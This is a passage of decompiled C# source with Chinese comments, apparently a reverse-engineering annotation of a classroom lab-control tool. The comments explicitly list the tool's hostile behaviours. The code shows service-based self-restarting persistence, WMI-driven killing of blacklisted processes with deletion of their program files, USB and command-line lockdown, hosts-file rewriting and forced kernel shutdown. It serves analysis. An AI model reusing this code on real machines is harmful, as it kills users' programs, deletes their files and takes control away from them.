using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using jfglzsn.Internal;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication1
{
	/// <summary>
	/// 主控窗体 + 整个「机房管理助手」的策略执行引擎。
	/// <para>
	/// 窗体本身不画界面（无边框、最小化、进任务栏为 false），<see cref="窗体加载初始化"/> 里建好
	/// 14 个定时器和一套 WMI 进程创建监听，之后靠定时器分阶段、分主题地轮询并处置违规行为。
	/// </para>
	/// <para>
	/// 恶意行为总览：
	/// ① 持久化——注册 <c>zmserv</c> 服务、从 <c>C:\windows\jf</c> 释放 <c>zmserv.exe</c>/<c>przs.exe</c>、
	/// 写两条 Run 自启动项并每 3 秒校验回写；
	/// ② 进程猎杀——WMI <c>__InstanceCreationEvent</c> 实时拦截新进程，命中 28 项进程名黑名单 /
	/// 78 项文件属性关键词黑名单后 <c>Kill()</c>，命中最重的分段还会删除程序文件；
	/// ③ 系统策略篡改——<c>DisableCMD</c>、"usbstor\Start = 4"（禁用 U 盘）、
	/// 强制关闭防火墙（netsh + 注册表两处）；
	/// ④ 封网——下载云端名单改写 hosts（设只读+隐藏+系统）并加黑洞路由、刷 DNS；
	/// ⑤ 破坏性操作——电子教室进程连续 5 次救不回来就 <c>NtShutdownSystem(2)</c> 内核关机。
	/// </para>
	/// </summary>
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public class Form1 : Form
	{
		/// <summary>
		/// 构造函数：挂两个窗体事件（Load = 全文初始化，FormClosing = 清理 WMI 监视器），
		/// 给全部字段赋初值，最后调 <see cref="初始化组件"/> 建好 14 个定时器。
		/// </summary>
		// Token: 0x06000037 RID: 55 RVA: 0x000029CC File Offset: 0x00000BCC
		public Form1()
		{
			base.Load += this.窗体加载初始化;
			base.FormClosing += this.窗体关闭清理;
			this.主循环计数 = 0L;
			this._AnnotationEvent = 0L;
			this.电子教室进程表 = new string[6];
			this.进程名黑名单 = new string[101];
			this.关键词黑名单 = new string[501];
			this.m_IndexerEvent = "";
			this.防火墙告警计数 = 0;
			this.网络告警计数 = 0;
			this._BaseEvent = 0;
			this.进程缺失计数 = 0;
			this.collectionEvent = 0L;
			this.极域通道号快照 = 0;
			this.极域自登录快照 = 0;
			this.极域注册表分支 = 0;
			this.tdfilefilter服务 = new ServiceController("tdfilefilter");
			this.tdnetfilter服务 = new ServiceController("tdnetfilter");
			this.载荷源目录 = "C:\\windows\\jf";
			this.hosts已写入 = false;
			this.hosts路径 = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			this.进程名匹配下标 = 0;
			this.m_InvocationEvent = new List<string>();
			this._RequestEvent = new List<string>();
			this._SerializerEvent = string.Empty;
			this.m_GlobalEvent = 0L;
			this.拉起计数 = 0L;
			this.m_ExporterEvent = "";
			this.m_SchemaEvent = false;
			this.初始化组件();
		}

		/// <summary>user32!ShowWindow —— 显示/隐藏窗口。<b>本工程没有调用点</b>，只留声明。</summary>
		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool ShowWindow(IntPtr 窗口句柄, int 显示方式);

		/// <summary>kernel32!GetDriveTypeA —— 取驱动器类型（DRIVE_REMOVABLE=2 等）。<b>本工程没有调用点</b>。</summary>
		// Token: 0x06000039 RID: 57
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern long GetDriveTypeA([MarshalAs(UnmanagedType.VBByRefStr)] ref string 根路径);

		/// <summary>ntdll!NtSuspendProcess —— 挂起整个进程（一条未公开的内核 API）。<b>本工程没有调用点</b>。</summary>
		// Token: 0x0600003A RID: 58
		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int NtSuspendProcess(IntPtr 进程句柄);

		/// <summary>ntdll!NtResumeProcess —— 恢复被挂起的进程。<b>本工程没有调用点</b>。</summary>
		// Token: 0x0600003B RID: 59
		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int NtResumeProcess(IntPtr 进程句柄);

		/// <summary>
		/// ntdll!RtlAdjustPrivilege —— 给当前进程开特权。
		/// <see cref="强制关机"/> 里用 19（<c>SeShutdownPrivilege</c>）把关机特权打开。
		/// </summary>
		// Token: 0x0600003C RID: 60
		[DllImport("ntdll.dll")]
		private static extern int RtlAdjustPrivilege(int 特权号, int 启用, int 当前线程, ref int 原状态);

		/// <summary>
		/// ntdll!NtShutdownSystem —— <b>内核级关机</b>，不经过用户态的正常关机流程，
		/// 参数 2 = <c>ShutdownPowerOff</c>（直接断电式关机），不给程序保存/拦截的机会。
		/// </summary>
		// Token: 0x0600003D RID: 61
		[DllImport("ntdll.dll")]
		private static extern int NtShutdownSystem(int 关机动作);

		/// <summary>user32!SetForegroundWindow —— 把窗口抢到前台。<b>本工程没有调用点</b>。</summary>
		// Token: 0x0600003E RID: 62
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool SetForegroundWindow(IntPtr 窗口句柄);

		/// <summary>user32!GetForegroundWindow —— 取当前前台窗口句柄。<b>本工程没有调用点</b>。</summary>
		// Token: 0x0600003F RID: 63
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		/// <summary>user32!GetWindowTextA —— 取窗口标题（ANSI）。<b>本工程没有调用点</b>。</summary>
		// Token: 0x06000040 RID: 64
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(IntPtr 窗口句柄, [MarshalAs(UnmanagedType.VBByRefStr)] ref string 缓冲区, int 最大字符数);

		/// <summary>user32!GetWindowThreadProcessId —— 由窗口句柄反查进程 ID。<b>本工程没有调用点</b>。</summary>
		// Token: 0x06000041 RID: 65
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr 窗口句柄, ref int 进程ID);

		/// <summary>user32!keybd_event —— 合成键盘/鼠标事件（可用来模拟按键）。<b>本工程没有调用点</b>。</summary>
		// Token: 0x06000042 RID: 66
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern void keybd_event(byte 虚拟键码, byte 扫描码, int 标志, int 附加信息);

		/// <summary>user32!BlockInput —— 屏蔽键盘鼠标输入。<b>本工程没有调用点</b>（键鼠封锁实际由 Form2/Form4 自己的遮罩窗完成）。</summary>
		// Token: 0x06000043 RID: 67
		[DllImport("user32.dll")]
		private static extern bool BlockInput(bool 阻止);

		/// <summary>
		/// 「主循环_分阶段启动」（<c>Timer_main</c>，6000 ms 心跳）——初始化期的分阶段启动器。
		/// <para>
		/// 每次心跳先给 <see cref="主循环计数"/> 加一；只要 hosts 还没被接管、云端域名也非空，
		/// 就顺带再拉一次名单（<see cref="下载并写入hosts黑名单"/>）。
		/// </para>
		/// <para>
		/// 之后按计数分阶段打开其余监视器：
		/// 1 = 口令与自启动项监控 + U 盘检查（<c>usb_jianche</c> 为 <c>on</c> 才开）；
		/// 4 = 防火墙监控 + 服务守护；5 = 网络监控，并且电子教室没了就从 <c>&lt;路径&gt;2</c> 补文件再拉起；
		/// 6 = 电子教室监视器 + 把 hosts 备份成 <c>hosts2</c> + 按需启动 hosts 刷新，最后关掉自己（初始化结束）。
		/// </para>
		/// <para>
		/// 原版整段 <c>On Error Resume Next</c>：每一步失败都被吞掉、继续下一步，
		/// 所以这里对每个外部调用各自 try/catch，纯内存赋值不抛异常、不再额外包一层。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer_main</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000044 RID: 68 RVA: 0x00002B30 File Offset: 0x00000D30
		private void 主循环_分阶段启动(object sender, EventArgs e)
		{
			checked
			{
				this.主循环计数 += 1L;
			}
			// hosts 还没接管、域名又配了 → 每次心跳都试着再拉一次名单
			if (!this.hosts已写入 & (Operators.CompareString(this.云端域名, "", false) != 0))
			{
				try { this.下载并写入hosts黑名单("http://" + this.云端域名 + "/hmd_net.txt", "on"); }
				catch (Exception) { }
			}
			if (this.主循环计数 == 1L)
			{
				// 口令摘要 + 两条自启动路径的基线都读到了，才启动监控
				if ((Operators.CompareString(this.口令摘要快照, "", false) != 0) & (Operators.CompareString(this.prozs自启动快照, "", false) != 0) & (Operators.CompareString(this.jfglzsn自启动快照, "", false) != 0))
				{
					this.Timer_qdx.Enabled = true;
				}
				string usb检查开关值 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", ""));
				if (Operators.CompareString(usb检查开关值, "on", false) == 0)
				{
					this.Timer_usb.Enabled = true;
				}
			}
			else if (this.主循环计数 == 4L)
			{
				this.Timer_fhq.Enabled = true;
				this.Timer1.Enabled = true;
			}
			else if (this.主循环计数 == 5L)
			{
				this.Timer_wangluo.Enabled = true;
				object 进程状态 = this.CheckProcessStatus(this.电子教室进程名);
				// 电子教室不在了：先用备份 <路径>2 把程序文件补回来，再重新拉起
				if (Operators.ConditionalCompareObjectEqual(进程状态, Form1.ProcessStatus.NotFound, false))
				{
					if (!File.Exists(this.电子教室程序路径))
					{
						this.备份程序路径 = this.电子教室程序路径 + "2";
						try { File.Copy(this.备份程序路径, this.电子教室程序路径); }
						catch (Exception) { }
					}
					try { Process.Start(this.电子教室程序路径); }
					catch (Exception) { }
				}
			}
			else if (this.主循环计数 == 6L)
			{
				object 进程状态 = this.CheckProcessStatus(this.电子教室进程名);
				// 注意：原版此处是 ConditionalCompareObjectNotEqual，即「进程不是 NotFound」才打开
				// 电子教室监视器（和直觉相反）。dnSpy 的原样条件，按字节码保留，没有改动极性。
				if (Operators.ConditionalCompareObjectNotEqual(进程状态, Form1.ProcessStatus.NotFound, false))
				{
					this.Timer_dzjs.Enabled = true;
				}
				try { File.SetAttributes(this.hosts路径 + "2", FileAttributes.Normal); }
				catch (Exception) { }
				try { File.Copy(this.hosts路径, this.hosts路径 + "2", true); }
				catch (Exception) { }
				if (!this.hosts已写入 & (Operators.CompareString(this.云端域名, "", false) != 0))
				{
					this.Timer_updatehosts.Enabled = true;
				}
				// 初始化流程走完，主心跳自己退场
				this.Timer_main.Enabled = false;
			}
		}

		/// <summary>
		/// 「定时显示警告窗」——Timer2（1000 ms）的心跳。
		/// 惩罚链第 2 级：Form2 是带密码门的全屏遮罩。这里每秒确认一次它还在前台，
		/// 只要被关掉/隐藏就立刻 <c>Show()</c> 重新弹出来，学生关不掉。
		/// </summary>
		/// <param name="sender">Timer2</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000045 RID: 69 RVA: 0x00002391 File Offset: 0x00000591
		private void 定时显示警告窗(object sender, EventArgs e)
		{
			if (!SetterEvent.ComputeCallback.Form2.Visible)
			{
				SetterEvent.ComputeCallback.Form2.Show();
			}
		}

		/// <summary>
		/// 「服务守护与自更新」（<c>Timer1</c>，6000 ms）——<b>持久化的核心</b>。
		/// <para>
		/// 第一段（服务）：<c>zmserv</c> 不在跑就补齐 <c>zmserv.exe</c>（从载荷 <c>C:\windows\jf\zmserv.dat</c> 释放）、
		/// 把 <c>DisableCMD</c> 写回 0（放开命令行）、<c>sc create</c> 注册成自启服务再 <c>net start</c>。
		/// </para>
		/// <para>
		/// 第二段（自身副本）：<see cref="拉起计数"/> 加一，补齐并启动守护副本 <c>przs.exe</c>；
		/// 连拉 5 次还起不来就整条链重启——放开 <c>DisableCMD</c>、<c>net stop zmserv</c>、等 3 秒、
		/// 重新 <c>sc create</c> + <c>net start</c>、<c>Process.Start(jfglzsn.exe)</c>，最后
		/// <c>ProjectData.EndApp()</c> 让旧进程自杀，形成杀不死的自重启环。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer1</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000046 RID: 70 RVA: 0x00002EF4 File Offset: 0x000010F4
		private void 服务守护与自更新(object sender, EventArgs e)
		{
			// —— 第一段：zmserv 服务守护 ——
			if (!this.进程是否在运行("zmserv"))
			{
				if (!File.Exists(Application.StartupPath + "\\zmserv.exe"))
				{
					if (File.Exists(this.载荷源目录 + "\\zmserv.dat"))
					{
						try { File.Copy(this.载荷源目录 + "\\zmserv.dat", Application.StartupPath + "\\zmserv.exe"); }
						catch (Exception) { }
					}
				}
				try { ThreadEvent.EnableCallback(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord); }
				catch (Exception) { }
				string 服务程序路径 = Application.StartupPath + "\\zmserv.exe";
				try { Interaction.Shell("sc create zmserv binPath= " + 服务程序路径 + " start= auto", AppWinStyle.Hide, true, -1); }
				catch (Exception) { }
				try { Interaction.Shell("net start zmserv", AppWinStyle.Hide, true, -1); }
				catch (Exception) { }
			}
			// —— 第二段：自身守护副本 przs.exe ——
			if (!this.进程是否在运行(Conversions.ToString(ThreadEvent.m_AdapterEvent)))
			{
				checked
				{
					this.拉起计数 += 1L;
				}
				if (!File.Exists(Application.StartupPath + "\\przs.exe"))
				{
					if (File.Exists(this.载荷源目录 + "\\przs.dat"))
					{
						try { File.Copy(this.载荷源目录 + "\\przs.dat", Application.StartupPath + "\\przs.exe"); }
						catch (Exception) { }
					}
				}
				try { Process.Start(Application.StartupPath + "\\przs.exe"); }
				catch (Exception) { }
				// 连拉 5 次都没起来 → 整条链重启，然后旧进程自杀
				if (this.拉起计数 >= 5L)
				{
					try { ThreadEvent.EnableCallback(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord); }
					catch (Exception) { }
					try { Interaction.Shell("net stop zmserv", AppWinStyle.Hide, true, -1); }
					catch (Exception) { }
					Thread.Sleep(3000);
					string 服务程序路径2 = Application.StartupPath + "\\zmserv.exe";
					try { Interaction.Shell("sc create zmserv binPath= " + 服务程序路径2 + " start= auto", AppWinStyle.Hide, true, -1); }
					catch (Exception) { }
					try { Interaction.Shell("net start zmserv", AppWinStyle.Hide, true, -1); }
					catch (Exception) { }
					try
					{
						Process.Start(Application.StartupPath + "\\jfglzsn.exe");
						ProjectData.EndApp();
					}
					catch (Exception) { }
				}
			}
		}

		/// <summary>
		/// 「检查USB存储禁用」（<c>Timer_usb</c>，5000 ms）——U 盘管控。
		/// <para>
		/// 学生只要把 <c>usbstor</c> 的 <c>Start</c> 改回 3（允许 USB 存储），
		/// 这里就把 <c>CurrentControlSet</c> + <c>ControlSet001~003</c> 四处全部写回 4（禁用），
		/// 然后弹惩罚链第 2 级 Form2「你修改注册表企图使用U盘！请重新启动电脑。」。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer_usb</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000047 RID: 71 RVA: 0x00003204 File Offset: 0x00001404
		private void 检查USB存储禁用(object sender, EventArgs e)
		{
			int 启动类型;
			try
			{
				启动类型 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", ""));
			}
			catch (Exception)
			{
				// 读不到就把读数当 0：等同于原版「出错后条件不成立、直接结束本轮」
				return;
			}
			if (启动类型 == 3)
			{
				try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord); }
				catch (Exception) { }
				try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord); }
				catch (Exception) { }
				try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord); }
				catch (Exception) { }
				try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord); }
				catch (Exception) { }
				try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你修改注册表企图使用U盘！请重新启动电脑。"; }
				catch (Exception) { }
				try { SetterEvent.ComputeCallback.Form2.Show(); }
				catch (Exception) { }
				this.Timer2.Enabled = true;
			}
		}

		/// <summary>
		/// 「电子教室进程监控」（<c>Timer_dzjs</c>，16000 ms）——按 <see cref="监控模式"/> 分三种打法。
		/// <para>模式 0：不监控，把本定时器关掉。</para>
		/// <para>模式 1：遍历 <see cref="电子教室进程表"/>，去掉 <c>.exe</c> 后逐个查进程，
		/// 只要有一个不在跑就弹 Form2「电子教室进程未找到或本地连接IP地址错误！请重新启动电脑。」。</para>
		/// <para>模式 2：状态机。Running 清零并收掉 Form3；Suspended / NotResponding 挂起计数 +1；
		/// NotFound 置缺失标志、缺失计数 +1，并从备份路径 <c>&lt;路径&gt;2</c> 补文件后重新拉起。
		/// 收尾三条铁律：缺失 ≥5 次 → <b>内核关机</b> + <c>shutdown /s /f /t 0</c>；
		/// 挂起 &gt;10 次 → Form2；&gt;8 次 → Form3。</para>
		/// </summary>
		/// <param name="sender">Timer_dzjs</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000048 RID: 72 RVA: 0x00003394 File Offset: 0x00001594
		private void 电子教室进程监控(object sender, EventArgs e)
		{
			checked
			{
				if (this.监控模式 == 0)
				{
					// 模式 0：不监控，定时器自己退场
					this.Timer_dzjs.Enabled = false;
					return;
				}
				if (this.监控模式 == 1)
				{
					// 模式 1：进程表里任何一个不在跑就上 Form2
					int 进程表上界 = Information.UBound(this.电子教室进程表, 1);
					for (int i = 0; i <= 进程表上界; i++)
					{
						string 进程名 = Strings.Replace(this.电子教室进程表[i], ".exe", "", 1, -1, CompareMethod.Binary);
						if (!this.进程是否在运行(进程名))
						{
							try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "电子教室进程未找到或本地连接IP地址错误！请重新启动电脑。"; }
							catch (Exception) { }
							try { SetterEvent.ComputeCallback.Form2.Show(); }
							catch (Exception) { }
							this.Timer2.Enabled = true;
						}
					}
					return;
				}
				if (this.监控模式 != 2)
				{
					return;
				}
				// 模式 2：按进程状态机处置
				Form1.ProcessStatus 进程状态 = this.CheckProcessStatus(this.电子教室进程名);
				switch (进程状态)
				{
				case Form1.ProcessStatus.Running:
					this.进程挂起计数 = 0;
					if (this.进程缺失标志)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
					}
					this.进程缺失标志 = false;
					break;
				case Form1.ProcessStatus.Suspended:
					this.进程挂起计数++;
					break;
				case Form1.ProcessStatus.NotResponding:
					this.进程挂起计数++;
					break;
				case Form1.ProcessStatus.NotFound:
					this.进程缺失标志 = true;
					this.进程缺失计数++;
					// 程序文件都没了：先从 <路径>2 把备份拷回来，再拉起
					if (!File.Exists(this.电子教室程序路径))
					{
						this.备份程序路径 = this.电子教室程序路径 + "2";
						try { File.Copy(this.备份程序路径, this.电子教室程序路径); }
						catch (Exception) { }
					}
					try { Process.Start(this.电子教室程序路径); }
					catch (Exception) { }
					break;
				}
				// 连续 5 次救不回来 → 提权到 SeShutdownPrivilege 后内核关机，再用 shutdown 兜底
				if (this.进程缺失计数 >= 5)
				{
					Form1.强制关机();
					try { Process.Start("shutdown", "/s /f /t 0"); }
					catch (Exception) { }
				}
				if (this.进程挂起计数 > 10)
				{
					try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "电子教室程序被暂停！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.Show(); }
					catch (Exception) { }
					this.Timer2.Enabled = true;
				}
				else if (this.进程挂起计数 > 8)
				{
					this.进程缺失标志 = true;
					try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "电子教室程序被暂停！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.Show(); }
					catch (Exception) { }
				}
			}
		}

		/// <summary>
		/// 「网络连接监控」（<c>Timer_wangluo</c>，17000 ms）——断网 / IP 变更检测 + 分级警告。
		/// <para>
		/// 1. 用 <see cref="GetWiredNetworkIP"/> 取有线网卡 IP；<see cref="原始IP"/> 还是空、
		/// 而当前 IP 合法（非 <c>169.254.*</c> 自动地址）时把它记成基线。
		/// </para>
		/// <para>
		/// 2. 取不到 IP = 拔了网线或禁用网卡：<see cref="网络告警计数"/> 累加，
		/// 超过 5 次升级到 Form2（「请重新启动电脑！」），否则只弹 Form3 警告。
		/// </para>
		/// <para>3. IP 和基线不一致 = 学生改了 IP：同样累加 + 分级警告，文案里带上原始 IP。</para>
		/// <para>4. 恢复正常就把 Form3 收掉、两个告警标志复位。</para>
		/// </summary>
		/// <param name="sender">Timer_wangluo</param>
		/// <param name="e">事件参数</param>
		// Token: 0x06000049 RID: 73 RVA: 0x0000375C File Offset: 0x0000195C
		private void 网络连接监控(object sender, EventArgs e)
		{
			checked
			{
				// 原版这一步出错也是「丢掉错误继续」，取不到 IP 就当空串（后面按断网处理）
				string 当前IP = null;
				try { 当前IP = this.GetWiredNetworkIP(); }
				catch (Exception) { }
				if (string.IsNullOrEmpty(this.原始IP))
				{
					if (!(string.IsNullOrEmpty(当前IP) || 当前IP.StartsWith("169.254.")))
					{
						this.原始IP = 当前IP;
					}
				}
				if (string.IsNullOrEmpty(当前IP))
				{
					// —— 断网分支 ——
					this.网络告警计数++;
					if (this.网络告警计数 > 5)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你拔了网线或禁用了网络连接！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming2.Text = "请重新启动电脑！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.Show(); }
						catch (Exception) { }
						this.Timer2.Enabled = true;
					}
					else
					{
						this.网线告警中 = true;
						try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "你拔了网线或禁用了网络连接！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.Show(); }
						catch (Exception) { }
					}
					return;
				}
				if ((Operators.CompareString(当前IP, this.原始IP, false) != 0) & (Operators.CompareString(this.原始IP, "", false) != 0))
				{
					// —— IP 被改分支 ——
					this.网络告警计数++;
					if (this.网络告警计数 > 5)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你修改了IP地址！原地址为:" + this.原始IP; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming2.Text = "请重新启动电脑！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.Show(); }
						catch (Exception) { }
						this.Timer2.Enabled = true;
					}
					else
					{
						this.IP告警中 = true;
						try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "你修改了IP地址！原地址为:" + this.原始IP; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.Show(); }
						catch (Exception) { }
					}
					return;
				}
				// —— 网络恢复：收起警告、复位标志 ——
				if (this.IP告警中 | this.网线告警中)
				{
					try { SetterEvent.ComputeCallback.Form3.Close(); }
					catch (Exception) { }
				}
				this.IP告警中 = false;
				this.网线告警中 = false;
			}
		}

		/// <summary>
		/// 「新进程拦截」——WMI <c>__InstanceCreationEvent</c> 的 <c>EventArrived</c> 回调，<b>整个程序的核心</b>。
		/// <para>
		/// 每 1 秒轮询一次 <c>Win32_Process</c> 的新建事件；拿到 PID / 进程名后取映像路径与
		/// 「产品名 + 文件说明」做两轮匹配：
		/// 第一轮拿 <c>"|" + 大写进程名</c> 去撞 <see cref="进程名黑名单"/>（<c>InStr</c> 子串匹配），
		/// 第二轮拿描述文本去撞 <see cref="关键词黑名单"/>（区分大小写的 <c>InStr</c>）。
		/// </para>
		/// <para>
		/// 第一轮命中后按 <see cref="进程名匹配下标"/> 分段处置：
		/// 1~10 = 杀毒软件（只弹 Form2 警告）；11~16 = 进程工具/任务管理器等（Kill + Form3）；
		/// 17~21 = 解压软件（<see cref="解压拦截开关"/> 不为 1 才 Kill）；
		/// ≥22 = 极域破解工具等（Kill + Form3 + 等 1 秒后 <c>FileSystem.Kill</c> <b>删除程序文件</b>）。
		/// </para>
		/// <para>
		/// 第二轮命中后按 <see cref="关键词匹配下标"/> 分段处置：≤4 / 5 / 6 / 7~50 / &gt;50，
		/// 越靠后越狠——最后一段同样是 Kill + 弹窗 + 删文件。
		/// </para>
		/// <para>原版整段 <c>On Error Resume Next</c>：杀不掉、删不掉都被吞掉，绝不中断后续判断。</para>
		/// </summary>
		/// <param name="sender">WMI 监视器</param>
		/// <param name="e">WMI 事件参数</param>
		// Token: 0x0600004A RID: 74 RVA: 0x00003B08 File Offset: 0x00001D08
		private void 新进程拦截(object sender, EventArrivedEventArgs e)
		{
			checked
			{
				ManagementBaseObject 目标实例;
				int 进程ID;
				Process 进程;
				string 程序路径;
				try
				{
					目标实例 = (ManagementBaseObject)e.NewEvent["TargetInstance"];
					进程ID = Conversions.ToInteger(目标实例["ProcessId"]);
					this.触发进程名 = 目标实例["Name"].ToString();
					进程 = Process.GetProcessById(进程ID);
					程序路径 = 进程.MainModule.FileName;
				}
				catch (Exception)
				{
					// 原版逐条忽略错误；这里几条一环扣一环，任何一条失败本轮都没法继续
					return;
				}
				string 描述文本 = "";
				bool 进程名命中 = false;
				bool 关键词命中 = false;
				if (string.IsNullOrEmpty(程序路径))
				{
					return;
				}
				try
				{
					FileVersionInfo 版本信息 = FileVersionInfo.GetVersionInfo(程序路径);
					string 产品名 = 版本信息.ProductName;
					string 文件说明 = 版本信息.FileDescription;
					描述文本 = 产品名 + 文件说明;
				}
				catch (Exception) { }
				// —— 第一轮：进程名黑名单 ——
				// 杀毒检查开关为 "off" 时从 2 起（放行第 1 项 HipsTray.exe 火绒托盘），否则从 1 起
				if (Operators.CompareString(this.杀毒检查开关, "off", false) == 0)
				{
					this.进程名匹配下标 = 2;
				}
				else
				{
					this.进程名匹配下标 = 1;
				}
				try
				{
					while (Operators.CompareString(this.进程名黑名单[this.进程名匹配下标], "", false) != 0)
					{
						string 表项 = this.进程名黑名单[this.进程名匹配下标];
						if (Strings.InStr("|" + Strings.UCase(this.触发进程名), Strings.UCase(表项), CompareMethod.Binary) != 0)
						{
							进程名命中 = true;
							break;
						}
						this.进程名匹配下标++;
					}
				}
				catch (Exception) { }
				// —— 第二轮：文件属性关键词黑名单 ——
				// 命令提示符检查开关为 "off" 时从 4 起（跳过后面前 3 项 cmd / PowerShell 关键词）
				if (Operators.CompareString(this.命令提示符检查开关, "off", false) == 0)
				{
					this.关键词匹配下标 = 4;
				}
				else
				{
					this.关键词匹配下标 = 1;
				}
				try
				{
					while (Operators.CompareString(this.关键词黑名单[this.关键词匹配下标], "", false) != 0)
					{
						string 关键词表项 = this.关键词黑名单[this.关键词匹配下标];
						if (Strings.InStr(描述文本, 关键词表项, CompareMethod.Binary) != 0)
						{
							关键词命中 = true;
							break;
						}
						this.关键词匹配下标++;
					}
				}
				catch (Exception) { }
				// —— 第一轮命中：按进程名黑名单的下标分段 ——
				if (进程名命中)
				{
					if (this.进程名匹配下标 <= 10)
					{
						// 杀毒软件：不杀，只弹 Form2 提醒「设置允许火绒杀毒」
						try { base.BeginInvoke(new MethodInvoker(this.显示杀毒软件警告)); }
						catch (Exception) { }
					}
					else if (this.进程名匹配下标 <= 16)
					{
						// 进程工具 / 任务管理器 / 虚拟桌面 / 扫雷 / 纸牌
						try { 进程.Kill(); }
						catch (Exception) { }
						try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
						catch (Exception) { }
					}
					else if (this.进程名匹配下标 <= 21)
					{
						// 解压软件：解压拦截开关为 1 时放行
						if (this.解压拦截开关 != 1)
						{
							try { 进程.Kill(); }
							catch (Exception) { }
							try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
							catch (Exception) { }
						}
					}
					else
					{
						// 极域破解工具 / 课堂狂欢器 / 吾爱破解等：杀进程 + 弹窗 + 删除程序文件
						try { 进程.Kill(); }
						catch (Exception) { }
						try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
						catch (Exception) { }
						try { 进程.WaitForExit(1000); }
						catch (Exception) { }
						try { FileSystem.Kill(程序路径); }
						catch (Exception) { }
					}
				}
				// —— 第二轮命中：按关键词黑名单的下标分段 ——
				if (!关键词命中)
				{
					return;
				}
				if (this.关键词匹配下标 <= 3)
				{
					Thread.Sleep(2000);
					try { 进程.Kill(); }
					catch (Exception) { }
				}
				else if (this.关键词匹配下标 == 4)
				{
					Thread.Sleep(2000);
					try { 进程.Kill(); }
					catch (Exception) { }
				}
				else if (this.关键词匹配下标 == 5)
				{
					try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
					catch (Exception) { }
					Thread.Sleep(2000);
					try { 进程.Kill(); }
					catch (Exception) { }
				}
				else if (this.关键词匹配下标 == 6)
				{
					try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
					catch (Exception) { }
					Thread.Sleep(2000);
					try { 进程.Kill(); }
					catch (Exception) { }
				}
				else if (this.关键词匹配下标 <= 50)
				{
